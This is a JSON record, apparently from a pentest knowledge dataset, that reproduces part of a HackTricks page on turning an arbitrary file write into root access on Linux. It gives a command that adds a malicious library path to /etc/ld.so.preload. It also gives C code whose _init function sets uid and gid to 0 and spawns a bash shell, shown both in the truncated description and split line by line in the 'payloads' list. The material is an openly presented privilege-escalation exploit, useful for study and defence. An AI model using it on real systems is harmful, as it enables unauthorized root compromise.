{
  "id": "linux_hardening_06c601c890f5",
  "category": "linux-hardening",
  "title": "write to root",
  "description": "# Arbitrary File Write to Root\n\n{{#include ../../banners/hacktricks-training.md}}\n\n### /etc/ld.so.preload\n\nThis file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\\\nIf you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.\n\nFor example: `echo \"/tmp/pe.so\" > /etc/ld.so.preload`\n\n```c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unlink(\"/etc/ld.so.preload\");\n   ",
  "payloads": [
    "# Arbitrary File Write to Root",
    "{{#include ../../banners/hacktricks-training.md}}",
    "### /etc/ld.so.preload",
    "This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\\",
    "If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.",
    "For example: `echo \"/tmp/pe.so\" > /etc/ld.so.preload`",
    "#include <stdio.h>",
    "#include <sys/types.h>",
    "#include <stdlib.h>",
    "void _init() {",
    "unlink(\"/etc/ld.so.preload\");",
    "setgid(0);",
    "setuid(0);",
    "system(\"/bin/bash\");",
    "//cd /tmp"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/linux-hardening/privilege-escalation/write-to-root.md"
  ]
}